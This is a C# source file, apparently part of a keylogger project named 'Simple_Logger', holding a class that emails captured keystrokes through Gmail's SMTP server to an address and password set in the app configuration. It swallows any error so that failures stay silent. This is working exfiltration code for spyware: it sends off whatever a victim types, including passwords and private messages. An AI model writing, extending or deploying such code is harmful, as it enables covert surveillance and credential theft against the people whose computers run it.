﻿using System;
using System.Configuration;
using System.Net;
using System.Net.Mail;

namespace Simple_Logger
{
    public class Email
    {
        public static void SendEmail(string keystrokes)
        {
            var client = new SmtpClient();

            var email = new MailMessage(ConfigurationManager.AppSettings["email"], ConfigurationManager.AppSettings["email"]);

            // Use TSL port

            client.Port = 587;
            client.EnableSsl = true;

            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;

            client.Credentials = new System.Net.NetworkCredential(ConfigurationManager.AppSettings["email"], ConfigurationManager.AppSettings["password"]);

            // Gmails smtp server

            client.Host = "smtp.gmail.com";

            email.Subject = "Logged Keystrokes";
            email.Body = keystrokes;

            try
            {
                client.Send(email);
            }

            catch
            {
                // If any exception is raised while trying to send an email, ignore it and don't send the email
            }
        }
    }
}